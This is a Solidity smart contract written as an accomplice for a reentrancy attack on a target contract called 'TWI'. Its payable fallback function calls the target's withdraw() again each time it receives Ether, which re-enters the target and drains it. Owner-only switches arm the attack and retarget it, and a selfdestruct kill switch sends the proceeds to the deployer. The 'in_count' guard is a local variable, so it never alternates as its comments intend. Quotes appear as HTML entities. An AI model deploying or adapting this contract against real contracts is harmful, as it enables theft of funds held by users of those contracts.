pragma solidity ^0.4.23;

contract AttackVectorAccompliceB {
    /*
    struct Record {
        address from;
        uint amount;
        uint ctime;
    }
    Record[] private records;
    */
    address private _owner;
    address private _TWIcontract;
    bool private safety_mode_on;
    
    constructor (address _twicontract) public { //know the TWI to attack
        _owner = msg.sender;
        safety_mode_on = true;
        _TWIcontract = address(_twicontract);
    }
    
    /*
    function getRecords() public returns (Record[]){
        return records;
    }
    */
    
    function toggleSafetyMode() public returns (bool) {
        require (msg.sender == _owner);
        safety_mode_on = !safety_mode_on;
        return safety_mode_on;
    }
    
    function safetyModeOn() public view returns (bool) {
        return safety_mode_on;
    }
    
    function setAttaccContract(address _addr) public {
        require(msg.sender == _owner);
        _TWIcontract = address(_addr);
    }
    
    function killSwitch() public {
        require (msg.sender == _owner);
        selfdestruct(_owner);
    }
    
    function () payable public {
        /*
        // commented out, can consume too much gas to render attack unsuccessful
        Record newrecord;
        newrecord.from = msg.sender;
        newrecord.amount = msg.value;
        newrecord.ctime = now;
        records.push(newrecord);
        */
        uint in_count;
        if (!safety_mode_on) {
            if (in_count == 0) {
                in_count = 1;
                _TWIcontract.call(bytes4(keccak256(&quot;withdraw()&quot;)));
            }
            else {
                in_count = 0; // reset
            }
        }
    }
}